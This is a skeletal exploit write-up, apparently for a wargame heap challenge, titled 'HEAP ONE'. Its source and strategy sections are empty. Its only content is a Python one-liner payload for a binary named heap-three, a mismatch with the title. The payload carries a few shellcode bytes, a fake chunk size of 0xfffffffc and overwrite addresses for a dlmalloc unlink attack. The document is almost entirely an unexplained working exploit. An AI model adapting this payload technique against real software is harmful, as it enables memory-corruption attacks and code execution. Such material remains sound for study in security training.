# HEAP ONE


## SOURCE CODE
```

```

## STRATEGY


## EXPLOIT

FINAL EXPLOIT:
```
./heap-three `python -c 'import struct; print "A"*12 + "\xB8\xD5\x87\x04\x08\xFF\xD0" + " " + "B"*36 + "\x65" + " " + "C"*92 + struct.pack("I", 0xfffffffc) + struct.pack("I", 0xfffffffc) + struct.pack("I", 0x804c130) + struct.pack("I",0xf7e69014)'`
```

